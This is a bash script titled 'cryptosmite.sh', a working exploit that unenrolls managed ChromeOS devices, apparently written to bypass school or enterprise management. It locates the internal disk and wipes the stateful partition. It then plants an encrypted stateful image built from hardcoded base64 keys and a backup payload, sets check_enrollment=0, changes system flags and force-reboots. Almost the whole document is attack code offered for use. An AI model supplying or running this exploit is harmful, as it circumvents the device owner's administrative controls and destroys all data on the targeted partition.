#!/bin/bash
#
# cryptosmite.sh remake or something
# by Writable and OlyB
#
# unenroll only for now, will add more features later
#

set -eE

SCRIPT_DATE="[2024-01-28]"
BACKUP_PAYLOAD=unenroll.tar.xz
NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB

[ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0

fail() {
	printf "%b\n" "$*" >&2
	exit 1
}

echo_sensitive() {
	if [ "$SENSITIVE_MODE" -eq 1 ]; then
		echo "Doing something"
	else
		echo "$@"
	fi
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

cleanup() {
	umount "$ENCSTATEFUL_MNT" || :
	cryptsetup close encstateful || :
	umount "$STATEFUL_MNT" || :
	trap - EXIT INT
}

key_crosencstateful() {
	cat <<EOF | base64 -d
24Ep0qun5ICJWbKYmhcwtN5tkMrqPDhDN5EonLetftgqrjbiUD3AqnRoRVKw+m7l
EOF
}

key_ecryptfs() {
	cat <<EOF | base64 -d
p2/YL2slzb2JoRWCMaGRl1W0gyhUjNQirmq8qzMN4Do=
EOF
}

[ -f "$BACKUP_PAYLOAD" ] || fail "$BACKUP_PAYLOAD not found!"

CROS_DEV="$(get_largest_cros_blockdev)"
[ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"

TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
[ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"

trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
trap 'cleanup; exit' EXIT
trap 'echo Abort.; cleanup; exit' INT

clear
echo "Welcome to Cryptosmite."
echo "Script date: ${SCRIPT_DATE}"
echo ""
echo "This will destroy all data on ${TARGET_PART} and unenroll the device."
echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
echo "Continue? (y/N)"
read -r action
case "$action" in
	[yY]) : ;;
	*) fail "Abort." ;;
esac

echo_sensitive "Wiping and mounting stateful"
mkfs.ext4 -F "$TARGET_PART" >/dev/null 2>&1
STATEFUL_MNT=$(mktemp -d)
mkdir -p "$STATEFUL_MNT"
mount "$TARGET_PART" "$STATEFUL_MNT"

echo_sensitive "Setting up encstateful"
truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block
ENCSTATEFUL_KEY=$(mktemp)
key_ecryptfs > "$ENCSTATEFUL_KEY"
cryptsetup open --type plain --cipher aes-cbc-essiv:sha256 --key-size 256 --key-file "$ENCSTATEFUL_KEY" "$STATEFUL_MNT"/encrypted.block encstateful

echo_sensitive "Wiping and mounting encstateful"
mkfs.ext4 -F /dev/mapper/encstateful >/dev/null 2>&1
ENCSTATEFUL_MNT=$(mktemp -d)
mkdir -p "$ENCSTATEFUL_MNT"
mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"

echo_sensitive "Dropping encstateful key"
key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization

echo_sensitive -n "Extracting backup to encstateful"
tar -xJf "$BACKUP_PAYLOAD" -C "$ENCSTATEFUL_MNT" --checkpoint=.100
echo ""

echo "Cleaning up"
cleanup

vpd -i RW_VPD -s check_enrollment=0 || : # this doesn't get set automatically
crossystem disable_dev_request=1 || :
crossystem disable_dev_request=1 # grunt weirdness
echo "SMITED SUCCESSFULLY!"
echo ""
echo "Exploit and original POC created by Writable (unretained)"
echo "This script created by OlyB"
echo ""
echo "Rebooting in 3 seconds"
sleep 3
reboot -f
sleep infinity
